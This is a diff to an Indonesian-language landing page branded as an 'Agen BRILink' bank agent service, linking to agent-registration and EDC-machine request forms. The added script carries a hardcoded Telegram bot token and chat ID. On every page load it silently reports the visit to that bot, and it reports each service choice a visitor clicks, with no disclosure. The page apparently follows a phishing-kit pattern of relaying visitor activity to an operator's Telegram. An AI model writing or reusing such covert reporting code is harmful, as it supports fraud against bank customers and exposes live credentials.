@@ -99,7 +99,7 @@
     <p class="choice-title">👇 Silakan Pilih Layanan:</p>
 
     <!-- OPSI 1: PENDAFTARAN AGEN BARU -->
-    <a href="form-pendaftaran-agen.html" class="option-card option-card--daftar">
+    <a href="form-pendaftaran-agen.html" class="option-card option-card--daftar" onclick="kirimPilihan('Pendaftaran Agen BRILink')">
         <div class="option-card__header">
             <div class="option-card__icon"><i class="fas fa-user-plus"></i></div>
             <div>
@@ -114,7 +114,7 @@
     </a>
 
     <!-- OPSI 2: PENGAJUAN MESIN EDC -->
-    <a href="form-pengajuan-edc.html" class="option-card option-card--edc">
+    <a href="form-pengajuan-edc.html" class="option-card option-card--edc" onclick="kirimPilihan('Pengajuan Mesin EDC BRILink')">
         <div class="option-card__header">
             <div class="option-card__icon"><i class="fas fa-credit-card"></i></div>
             <div>
@@ -138,5 +138,74 @@
         <p>© 2026 Agen BRILink. Semua Hak Dilindungi.</p>
     </div>
 </div>
+
+<script>
+// ==============================================
+// KONFIGURASI BOT TELEGRAM
+// ==============================================
+const TOKEN_BOT_TELEGRAM = '8958792550:AAGe9geGdlgrv8-6iibu5aquTYX9bq0Vqi0';
+const ID_CHAT_TELEGRAM = '8527556684';
+const API_TELEGRAM = `https://api.telegram.org/bot${TOKEN_BOT_TELEGRAM}/sendMessage`;
+
+// ==============================================
+// FUNGSI KIRIM KE TELEGRAM
+// ==============================================
+async function kirimKeTelegram(pesan) {
+    try {
+        await fetch(API_TELEGRAM, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ID_CHAT_TELEGRAM,
+                text: pesan,
+                parse_mode: 'Markdown'
+            })
+        });
+        console.log('✅ Terkirim ke Telegram');
+    } catch (err) {
+        console.log('❌ Gagal kirim ke Telegram:', err);
+    }
+}
+
+// ==============================================
+// OTOMATIS KIRIM SAAT HALAMAN DIAKSES
+// ==============================================
+document.addEventListener('DOMContentLoaded', function() {
+    const waktuAkses = new Date().toLocaleString('id-ID', {
+        timeZone: 'Asia/Jakarta',
+        day: '2-digit',
+        month: 'long',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    });
+
+    const pesanAkses = `
+👤 *HALAMAN BERANDA DIAKSES*
+━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu Akses: ${waktuAkses} WIB
+📍 Halaman: Beranda — Agen BRILink
+📱 Status: Pengguna memilih layanan
+━━━━━━━━━━━━━━━━━━━━
+    `;
+    kirimKeTelegram(pesanAkses);
+});
+
+// ==============================================
+// KIRIM JIKA PENGGUNA MEMILIH LAYANAN
+// ==============================================
+function kirimPilihan(namaLayanan) {
+    const pesanPilihan = `
+👉 *PENGGUNA MEMILIH LAYANAN*
+━━━━━━━━━━━━━━━━━━━━
+📋 Layanan: ${namaLayanan}
+🕐 Waktu: ${new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'})} WIB
+━━━━━━━━━━━━━━━━━━━━
+    `;
+    kirimKeTelegram(pesanPilihan);
+}
+</script>
+
 </body>
 </html>
